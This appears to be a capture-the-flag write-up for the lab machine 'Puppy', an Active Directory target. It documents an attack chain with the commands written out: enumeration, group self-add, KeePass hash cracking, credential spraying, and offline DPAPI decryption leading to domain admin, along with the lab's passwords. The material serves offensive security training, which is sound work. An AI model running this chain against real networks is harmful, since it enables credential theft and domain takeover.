# Puppy: Machine Notes

## Initial Credentials
- User: `levi.james`
- Password: `KingofAkron2025!`

## Recon & AD Enumeration

### Nmap
- DCs: DNS (53), Kerberos (88), LDAP (389, 3268), SMB (445), WinRM (5985), NFS (2049)
- Domain: `PUPPY.HTB`

### SMB & LDAP Enumeration
```bash
netexec smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
ldapsearch -x -H ldap://10.129.232.75 -b "DC=puppy,DC=htb" -D "levi.james@puppy.htb" -w 'KingofAkron2025!' "(objectClass=user)"
faketime -f "+7h" bloodhound-python -d puppy.htb -u levi.james -p 'KingofAkron2025!' -ns 10.129.232.75 -c All
```

### Adding User to Group (Privilege Escalation Vector)
```bash
impacket-net puppy.htb/levi.james:'KingofAkron2025!'@10.129.232.75 group -name "DEVELOPERS" -join "levi.james"
```

## Exploitation

### KeePass File Extraction & Cracking
- Found `recovery.kdbx` on the `DEV` share.
- Cracking:
```bash
# Extract hash (using custom/newer keepass2john if standard fails)
keepass2john recovery.kdbx > recovery.hash
# Crack with John
john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt recovery.hash
```
- DB Password: `liverpool`
- Credentials inside KDBX: `HJKL2025!`, `Antman2025!`, `JamieLove2025!`, `ILY2025!`, `Steve2025!`

### Horizontal Movement
- Credential Spraying:
```bash
nxc smb puppy.htb -u users.txt -p passwords.txt --continue-on-success
```
- Found valid: `ant.edwards:Antman2025!`

### Local Privilege Escalation (DPAPI)
1. Found `nms-auth-config.xml.bak` with `steph.cooper:ChefSteph2025!`.
2. Login as `steph.cooper` via WinRM.
3. Use `winPEAS` to find DPAPI master keys and roaming credentials.
   - MasterKey Location: `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\...`
   - CredFile: `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9`

4. Decrypt DPAPI (Offline):
```bash
# Decode base64 blobs from WinRM
echo "[CRED_BLOB]" | base64 -d > cred.bin
echo "[MASTERKEY_BLOB]" | base64 -d > masterkey.bin

# Decrypt MasterKey
dpapi.py masterkey -file masterkey.bin -sid S-1-5-21-... -password 'ChefSteph2025!'
# Decrypt Credential
dpapi.py credential -file cred.bin -key [DECRYPTED_MASTERKEY]
```
- Resulting Credential: `steph.cooper_adm:FivethChipOnItsWay2025!`

## Final Goal
- Use `steph.cooper_adm` for Domain Admin access.
